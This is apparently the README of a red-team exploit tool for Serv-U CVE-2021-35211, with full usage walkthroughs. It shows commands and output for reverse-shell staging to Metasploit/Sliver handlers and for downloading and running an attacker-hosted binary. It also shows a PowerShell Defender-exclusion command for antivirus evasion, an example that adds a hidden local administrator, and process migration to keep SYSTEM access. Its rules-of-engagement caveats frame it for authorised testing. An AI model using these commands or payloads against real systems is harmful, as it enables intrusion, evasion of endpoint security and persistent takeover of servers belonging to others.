# Serv-U CVE-2021-35211 Exploit

## Potential for DoS - check your rules of engagement
The exploit doesn't work every time, but it works enough that it will run shellcode in roughly 1 in every 5 or 6 runs. However, sometimes a failed exploit will crash the Serv-U server. Please ensure that your rules of engagement permit the risk of loss or degradation of service. Symptoms seen in testing include:
* crash and automatic restart (most common)
* disconnecting logged-in users during successful and *un*successful attempts
* crash with failure to automatically restart

**Caveat emptor**.

## Quick Start
Versions are important. This exploit uses hard-coded ROP addresses valid only against Serv-U version `15.2.3.717`. We may be able to add other versions, please ask if you need it to work with different versions of Serv-U or Windows.

### Check the version on your target

```
% ncat www.example.com 22
SSH-2.0-Serv-U_15.2.3.717
```

### Running the exploit
It takes the following arguments:

```
% python3 CVE-2021-35211.py
usage: CVE-2021-35211.py [-h] [-p TARGETPORT] targetHost {stage,exec,downloadexec} ...
```

There three modes (or payloads) that you can run in a successful attack:

1. `stage`
2. `exec`
3. `downloadexec`

### Stage mode
Upon successful exploit, runs a Metasploit/Sliver-compatible shellcode stager. It is the least reliable of all the payloads; consider `downloadexec1 instead. Run like this:

```
% python3 CVE-2021-35211.py example.com stage -h
usage: CVE-2021-35211.py targetHost stage [-h] stageHost stagePort

positional arguments:
  stageHost   Hostname or IPv4 address of your Metasploit/Sliver shellcode staging instance
  stagePort   Port number for your staging instance

optional arguments:
  -h, --help  show this help message and exit
```

`stageHost` and `stagePort` will point to a listening handler on your Sliver/Metasploit box. You can choose any payload you like, but I've found that the only one that works reliably is `windows/x64/shell/reverse_tcp`. This is a shame because this isn't an encrypted shell and you'll need to check your rules of engagement before popping something like that.

Again, **caveat emptor**.

Set it up in Metasploit running on your kali box like so:

```
elvis@kali:~ msfconsole
...
msf5 >
msf5 > handler -H 0.0.0.0 -P 10444 -p windows/x64/shell/reverse_tcp
[*] Payload handler running as background job 1.
```

Then run the exploit:

```
% python3 CVE-2021-35211.py example.com stage your.metasploit.box 31337
[+] Targeting example.com:22
[+] Setting up exploit payload buffer
[+] Constructing ROP chain
[+] Adding shellcode
[+] Spraying Serv-U-FTP server @ example.com:22
[+] Sending exploit trigger payload...
[+] Done! Sometimes it takes a few runs to work - try again if it failed.

```

Back on the kali box you should see the stage request and the command shell starting:

```
msf5 >
[*] Sending stage (336 bytes) to example.com
[*] Command shell session 6 opened (10.10.10.14:10444 -> example.com:57562) at 2021-10-22 18:50:11 +0000

msf5 >sessions -i 6
[*] Starting interaction with 6...


(c) Microsoft Corporation. All rights reserved.

C:\Program Files\RhinoSoft\Serv-U>whoami
whoami
nt authority\system
```

#### Sliver
Sliver support in the stager payload is highly experimental and rarely works. If it does work you'll normally see the sessions start and immediately die. But if you get a session that doesn't immediately terminate you can take steps to maintain your Sliver access by migrating to a different process.

On your Sliver server run the `stage-listener` command to setup your listener. See the [Sliver docs](https://github.com/BishopFox/sliver/wiki/Stagers) for more details on staging:

```
elvis@h:/ehome/haggis$ sudo sliver-server

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain first strike
[*] Server v1.4.17 - 410f0756d26cb279216aecde68c14e68b5c9df32
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

sliver > 
sliver > stage-listener --url tcp://0.0.0.0:10443 --profile win-shellcode
```

Run the exploit in stage mode:

```
% python3 CVE-2021-35211.py example.com stage your.sliver.box 10443
[+] Targeting example.com:22
[+] Setting up exploit payload buffer
[+] Constructing ROP chain
[+] Adding shellcode
[+] Spraying Serv-U-FTP server @ example.com:22
[+] Sending exploit trigger payload...
[+] Done! Sometimes it takes a few runs to work - try again if it failed.
```

If the exploit works (and it very rarely works with Sliver or Meterpreter payloads), you'll see something like this (and yes, Sliver came up with that payload name all by itself!):

```
[*] Session #4 ARTISTIC_PANTIES - example.com:57071 (WIN-EMCK6E5O0DI) - windows/amd64 - Wed, 20 Oct 2021 04:24:10 UTC

sliver > sessions -i 4

[*] Active session ARTISTIC_PANTIES (4)

sliver (ARTISTIC_PANTIES) > info

                ID: 4
              Name: ARTISTIC_PANTIES
          Hostname: WIN-EMCK6E5O0DI
              UUID: 0af9fbf2-c8b0-498c-8d9d-332f13e5d0f8
          Username: NT AUTHORITY\SYSTEM
               UID: S-1-5-18
               GID: S-1-5-18
               PID: 3956
                OS: windows
           Version: Server 2016 build 20348 x86_64
              Arch: amd64
    Remote Address: example.com:57071
         Proxy URL: none
     Poll Interval: 1
Reconnect Interval: 60
```

The first thing you should do is migrate to a different process because there's a good chance your Sliver session will die and not come back, and I don't know the root cause at time of writing.

```
sliver (ARTISTIC_PANTIES) > ps

pid   ppid  owner                         executable                   session
===   ====  =====                         ==========                   =======
0     0                                   [System Process]             -1
4     0                                   System                       0
...
3872  728   NT AUTHORITY\SYSTEM           svchost.exe                  0
4868  728   BUILTIN\Administrators        Serv-U.exe                   0
4636  868   BUILTIN\Administrators        dllhost.exe                  0

sliver (ARTISTIC_PANTIES) > migrate 3872

[*] Successfully migrated to 3872
```

At this point you should have a solid Sliver session immune to the vagaries of Serv-U and this exploit.

### Download and execute mode
The most reliable mode and the least likely to get pinged by Microsoft Defender end-point security. This is because it uses a Powershell command (`powershell -Command "& {Add-MpPreference -ExclusionPath c:\windows\temp}"`) to add a directory exclusion to Microsoft Defender so that Sliver/Meterpreter/whatever binaries don't get scanned for malware. This will protect you against Windows Defender, but that's all; you'll need to account for other endpoint security technology, network IDS, etc.

On success, downloads a binary from a URL and executes it. You'll need a webserver hosting your executable file. I used Python, but please note that I'm testing on a local network without SSL. In real exploits you'll need to check your rules of engagement if you want to use unencrypted URLs.

Not for the first time: **caveat emptor**.

Run a simple HTTP listener like so:

```
% python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

With the listener running you can run the exploit:

```
% python3 serv-u-exploit2.py example.com downloadexec http://192.168.0.144:8000/calc.exe
[+] Targeting example.com:22
[+] Setting up exploit payload buffer
[+] Constructing ROP chain
[+] Adding shellcode
[+] Spraying Serv-U-FTP server @ example.com:22
[+] Sending exploit trigger payload...
[+] Done! Sometimes it takes a few runs to work - try again if it failed.
```

You should see something like this in your listener:

```
192.168.0.144 - - [22/Oct/2021 12:28:24] "GET /calc.exe HTTP/1.1" 200 -
```

The target will execute `calc.exe` and restart the Serv-U service to allow users to start connecting again. Note that the executable will not present a window, but if you run this example you should see `wincalc.exe` in Task Manager.

#### Command execution mode
On success, runs a command on the target. Run like so:

```
% python3 serv-u-exploit2.py example.com exec 'net user bishopfox r34LLy.g00d_p4ssW0rd /add & net localgroup administrators bishopfox /add'
[+] Targeting example.com:22
[+] Setting up exploit payload buffer
[+] Constructing ROP chain
[+] Adding shellcode
[+] Spraying Serv-U-FTP server @ example.com:22
[+] Sending exploit trigger payload...
[+] Done! Sometimes it takes a few runs to work - try again if it failed.
```

### Credits

* The Microsoft researchers who fuzzed the vuln: https://www.microsoft.com/security/blog/2021/09/02/a-deep-dive-into-the-solarwinds-serv-u-ssh-vulnerability/
* @NattiSamson did the PoC on which my code is based: https://github.com/NattiSamson/Serv-U-CVE-2021-35211/blob/main/CVE-2021-35211_PoC.py

### Final thoughts
This exploit does tend to crash the remote process, unfortunately. Generally it restarts and I'm trying to see if I can make it more stable, but until then please remember: check your rules of engagement and caveat emptor.

The fact that ASLR was disabled on the Serv-U dll was crazy lucky and saved a lot of hassle. 

Other mitigations, such as Control Flow Guard ("CFG"), were also disabled. This again made it easy to write an exploit without having to work around restricted access to critical functions, such as GetProcAddress().

It's worth pointing out that the method I use to calculate the address of the ROP stack can, on occasion, generate an address that isn't 64-bit aligned. As a result, when GetProcAddress() reaches a MOVAPS instruction (which requires memory addresses to be aligned) the exploit crashes. To make the exploit more reliable, one solution might be to force the ROP stack to be located at an aligned address; this would require some wrangling of the ROP payload and is left as an exercise for the reader. 
